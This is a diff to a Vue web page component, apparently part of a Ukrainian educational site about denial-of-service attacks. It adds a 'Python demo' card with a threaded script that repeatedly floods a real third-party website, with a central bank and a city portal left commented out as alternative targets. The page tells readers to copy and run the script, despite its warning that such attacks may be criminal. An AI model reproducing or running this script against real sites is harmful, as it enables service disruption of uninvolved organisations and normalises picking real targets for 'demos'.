@@ -14,6 +14,58 @@
         <n-li>Сервер не встигає обробляти всі запити і стає недоступним.</n-li>
       </n-ul>
 
+      <n-card title="🧪 Python-демо: DoS-атака" embedded>
+        <p>Нижче простий приклад коду для DoS-атаки. Скопіюйте і запустіть у середовищі Python :</p>
+        <n-alert title="⚠️ Попередження" type="warning" class="mb-4" bordered>
+          Не намагайтесь організовувати DoS-атаки самостійно.
+          Це може бути кримінальним правопорушенням відповідно до законодавства.
+        </n-alert>
+
+        <n-button @click="show = !show" size="small" tertiary type="info" class="my-2">
+          {{ show ? 'Сховати код' : 'Показати код' }}
+        </n-button>
+
+        <n-collapse-transition  v-if="show">
+          <n-code
+              v-if="show"
+              language="python"
+              show-line-numbers
+              word-wrap
+              class="rounded-lg"
+              v-pre
+          >
+<pre>
+import urllib.request
+import threading
+import time
+
+# target_url = "https://www.cbr.ru/"  # Замінити на тестовий сайт
+# target_url = "https://my.mos.ru"
+target_url = "https://spark-interfax.ru"
+num_threads = 10  # Зменшено для безпечного тесту
+delay_seconds = 1  # Затримка між запитами
+
+def attack():
+    while True:
+        try:
+            response = urllib.request.urlopen(target_url)
+            print(f"[{threading.current_thread().name}] Відповідь: {response.status}")
+        except Exception as e:
+            print(f"[{threading.current_thread().name}] Помилка: {e}")
+        time.sleep(delay_seconds)
+
+threads = []
+
+for i in range(num_threads):
+    t = threading.Thread(target=attack, name=f"Потік-{i+1}")
+    t.start()
+    threads.append(t)
+
+</pre>
+          </n-code>
+        </n-collapse-transition>
+      </n-card>
+
       <n-divider />
 
       <n-p strong>Приклади та наслідки:</n-p>
@@ -41,6 +93,16 @@
 </template>
 
 <script setup lang="ts">
-import { NSpace, NCard, NDivider, NUl, NLi, NP } from 'naive-ui';
+import { ref } from 'vue'
+import { NSpace, NCard, NDivider, NUl, NLi, NP, NButton, NCode, NCollapseTransition } from 'naive-ui';
 import Link from '../Link.vue';
+
+const show = ref(false)
 </script>
+
+<style scoped>
+.my-2 {
+  margin-top: 0.5rem;
+  margin-bottom: 0.5rem;
+}
+</style>
